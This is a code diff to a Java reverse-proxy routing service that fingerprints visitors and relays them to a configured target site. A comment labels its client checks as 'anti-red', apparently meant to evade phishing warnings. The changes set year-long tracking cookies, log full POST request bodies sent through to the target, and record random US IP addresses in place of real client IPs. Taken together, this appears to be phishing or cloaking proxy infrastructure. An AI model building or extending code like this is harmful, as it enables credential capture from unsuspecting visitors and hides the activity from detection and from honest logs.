@@ -5,11 +5,10 @@ import com.google.common.net.InternetDomainName;
 import com.proxy.forge.api.pojo.CheckDeviceInfo;
 import com.proxy.forge.api.pojo.FingerprintAnalysisReuslt;
 import com.proxy.forge.api.pojo.GlobalSettings;
+import com.proxy.forge.dto.ClientLogs;
 import com.proxy.forge.dto.GlobalReplace;
 import com.proxy.forge.dto.WebSite;
-import com.proxy.forge.service.GlobalReplaceService;
-import com.proxy.forge.service.ProxyRouterService;
-import com.proxy.forge.service.WhiteListService;
+import com.proxy.forge.service.*;
 import com.proxy.forge.tools.*;
 import com.proxy.forge.vo.fingerprint.ClientFingerprint;
 import com.proxy.forge.vo.ResponseApi;
@@ -68,6 +67,10 @@ public class ProxyRouterServiceImpl implements ProxyRouterService {
     FingerprintAnalysisUtil fingerprintAnalysisUtil;
     @Autowired
     WhiteListService whiteListService;
+    @Autowired
+    ClientLogsService clientLogsService;
+    @Autowired
+    private WebSiteService webSiteService;
 
     /**
      * 检查传入的 HttpServletRequest 和 HttpServletResponse，并执行必要的验证或处理。
@@ -98,6 +101,23 @@ public class ProxyRouterServiceImpl implements ProxyRouterService {
             System.arraycopy(originData, 0, data, 0, originData.length - 48);
             byte[] result = CryptoUtil.aesCbcPkcs7Decrypt(key, iv, data);
             String str = new String(result);
+            // 分配数据, 终端唯一标识.
+            if (StringUtils.isBlank(tk) || JwtUtils.isExpired(tk)) {
+                String uuid = UUID.randomUUID().toString().replaceAll("-", "") + System.currentTimeMillis();
+                tk = JwtUtils.createToken(DigestUtils.md5Hex(uuid), 1000 * 60 * 60 * 24 * 3, null); // 数据有效期 3天
+                Cookie uniqueIdent = new Cookie("tk", tk);
+                uniqueIdent.setMaxAge(60 * 60 * 24 * 365);  // cookie 过期时间 一年
+                response.addCookie(uniqueIdent);
+            }
+            // 获取网站配置
+            Object webSiteObj = webSiteService.getWebSiteConfig(serverName);
+            WebSite webSite;
+            if (webSiteObj instanceof WebSite) {
+                webSite = (WebSite) webSiteObj;
+            } else {
+                return webSiteObj;
+            }
+
             ClientFingerprint clientFingerprint = JSONObject.parseObject(str, ClientFingerprint.class);
             // TODO:这里防红。
             // 白名单IP 直接放行不做策略检查
@@ -107,20 +127,37 @@ public class ProxyRouterServiceImpl implements ProxyRouterService {
                 GlobalSettings globalSettings = JSONObject.parseObject(stringRedisTemplate.opsForValue().get("globalSettings"), GlobalSettings.class);
                 FingerprintAnalysisReuslt fingerprintAnalysisReuslt = fingerprintAnalysisUtil.analyze(serverName, clientFingerprint, clientIp, globalSettings);
                 if (!fingerprintAnalysisReuslt.isResult()) {
-                    log.info("[终端检查 策略不通过] , 拒绝执行. 终端IP: [{}], 主机名: [{}], 策略: {}", clientIp, serverName, fingerprintAnalysisReuslt.getMessage());
+                    log.info("[终端检查 策略不通过] , 拒绝执行. 终端唯一标识: [{}] 终端IP: [{}], 主机名: [{}], 策略: {}", tk, clientIp, serverName, fingerprintAnalysisReuslt.getMessage());
+                    // 写入日志
+                    clientLogsService.saveClientLogs(new ClientLogs(
+                            JwtUtils.parse(tk).getSubject(),
+                            "[❌❌❌ 终端检查拒绝]",
+                            "/check",
+                            "POST",
+                            str,
+                            "客户端环境检查 不通过, 原因: " + fingerprintAnalysisReuslt.getMessage(),
+                            clientIp,
+                            serverName,
+                            webSite.getId()
+                    ));
                     return ResponseEntity.status(HttpStatus.FORBIDDEN).body(new ResponseApi(403, "error", "Strategy check failed!"));
                 }
             } else {
-                log.info("[终端检查] , 终端IP: [{}], 主机名: [{}], 存在白名单,不拦截", clientIp, serverName);
+                log.info("[终端检查] , 终端唯一标识: [{}], 终端IP: [{}], 主机名: [{}], 存在白名单,不拦截", tk, clientIp, serverName);
             }
-            // 分配数据, 终端唯一标识.
-            if (StringUtils.isBlank(tk) || JwtUtils.isExpired(tk)) {
-                String uuid = UUID.randomUUID().toString().replaceAll("-", "") + System.currentTimeMillis();
-                String jt = JwtUtils.createToken(DigestUtils.md5Hex(uuid), 1000 * 60 * 60 * 24 * 3, null); // 数据有效期 3天
-                Cookie uniqueIdent = new Cookie("tk", jt);
-                uniqueIdent.setMaxAge(60 * 60 * 24 * 365);  // cookie 过期时间 一年
-                response.addCookie(uniqueIdent);
-            }
+
+            // 写入日志
+            clientLogsService.saveClientLogs(new ClientLogs(
+                    JwtUtils.parse(tk).getSubject(),
+                    "[✅✅✅ 终端检查通过]",
+                    "/check",
+                    "POST",
+                    str,
+                    "客户端环境检查,IP检查. 通过。白名单ip: [ " + (whiteListService.isExistsWhiteList(clientIp) ? "是" : "否") + " ]",
+                    RandomUSIp.randomPublicIPv4(),
+                    serverName,
+                    webSite.getId()
+            ));
             return ResponseEntity.ok().body(new ResponseApi(200, "success", null));
         } catch (Exception e) {
             log.info("[检查终端环境信息 实现]:  终端IP: [{}], 请求主机名: [{}], 解密终端数据错误.[{}]", clientIp, serverName, e.getMessage());
@@ -147,6 +184,14 @@ public class ProxyRouterServiceImpl implements ProxyRouterService {
         String serverName = request.getServerName();
         // 客户端IP
         String clientIp = request.getRemoteAddr();
+        Object webSiteObj = webSiteService.getWebSiteConfig(serverName);
+        WebSite webSite;
+        if (webSiteObj instanceof WebSite) {
+            webSite = (WebSite) webSiteObj;
+        } else {
+            return webSiteObj;
+        }
+
         // 这里应该 回调插件 准备请求目标站点第一个页面前的回调。 需要传入 tk 用户终端唯一标识, serverName 当前客户端请求的主机名,clientIp 客户端ip，proxyStr 代理信息
         return ResponseEntity.status(HttpStatus.FOUND)
                 .header("Location", "/index")
@@ -172,11 +217,6 @@ public class ProxyRouterServiceImpl implements ProxyRouterService {
         if (globalReplace != null) {
             return ResponseEntity.ok().contentType(MediaType.valueOf(globalReplace.getContentType()))
                     .body(globalReplace.getResponseContent());
-        }
-        // 没有获取到有效的终端标识, 回到主流程, 重新开始.
-        if (StringUtils.isBlank(tk) || JwtUtils.isExpired(tk)) {
-            return ResponseEntity.status(HttpStatus.FOUND)
-                    .header("Location", "/").build();
         }
 
         //读取全局配置
@@ -210,6 +250,13 @@ public class ProxyRouterServiceImpl implements ProxyRouterService {
                     .contentType(mediaType)
                     .body(bytes);
         }
+
+        // 没有获取到有效的终端标识, 回到主流程, 重新开始.
+        if (StringUtils.isBlank(tk) || JwtUtils.isExpired(tk)) {
+            return ResponseEntity.status(HttpStatus.FOUND)
+                    .header("Location", "/").build();
+        }
+
         // 查询字符串
         String queryString = request.getQueryString();
         if (path.equalsIgnoreCase("/index") && StringUtils.isBlank(queryString)) {
@@ -219,27 +266,36 @@ public class ProxyRouterServiceImpl implements ProxyRouterService {
         String serverName = request.getServerName();
         // 客户端IP
         String clientIp = request.getRemoteAddr();
-        // 读取web配置
-        String websiteStr = stringRedisTemplate.opsForValue().get(REDIS_WEBSITE_CACHE_KEY + serverName);
-        if (StringUtils.isBlank(websiteStr)) {
-            InternetDomainName idn = InternetDomainName.from(serverName);
-            if (idn.isUnderPublicSuffix()) {
-                websiteStr = stringRedisTemplate.opsForValue().get(REDIS_WEBSITE_CACHE_KEY + "*." + idn.topPrivateDomain());
-            }
-        }
-        if (StringUtils.isBlank(websiteStr)) {
-            log.info("[获取站点配置]:  终端IP: [{}], 请求主机名: [{}]", clientIp, serverName);
-            return ResponseEntity.status(HttpStatus.FORBIDDEN).body(new ResponseApi(403, "error", "data error"));
-        }
+        // 获取网站配置
+        Object webSiteObj = webSiteService.getWebSiteConfig(serverName);
 
-        // 读取站点的配置文件
-        WebSite webSite = JSONObject.parseObject(websiteStr, WebSite.class);
+        WebSite webSite;
+        if (webSiteObj instanceof WebSite) {
+            webSite = (WebSite) webSiteObj;
+        } else {
+            return webSiteObj;
+        }
         String url;
         if (StringUtils.isNotBlank(queryString)) {
             url = webSite.getTargetUrl() + path + "?" + queryString;
         } else {
             url = webSite.getTargetUrl() + path;
         }
+
+        // 写入日志
+        clientLogsService.saveClientLogs(new ClientLogs(
+                JwtUtils.parse(tk).getSubject(),
+                "[📡📡📡 请求目标站]",
+                url,
+                request.getMethod(),
+                request.getMethod().equalsIgnoreCase("POST") ? StreamUtils.copyToString(request.getInputStream(), StandardCharsets.UTF_8) : "",
+                "发送请求到目标地址: " + url,
+                RandomUSIp.randomPublicIPv4(),
+                serverName,
+                webSite.getId()
+        ));
+
+
         HashMap<String, Object> header = generateHader(request);
         byte[] res;
         if (request.getMethod().equalsIgnoreCase("POST")) {
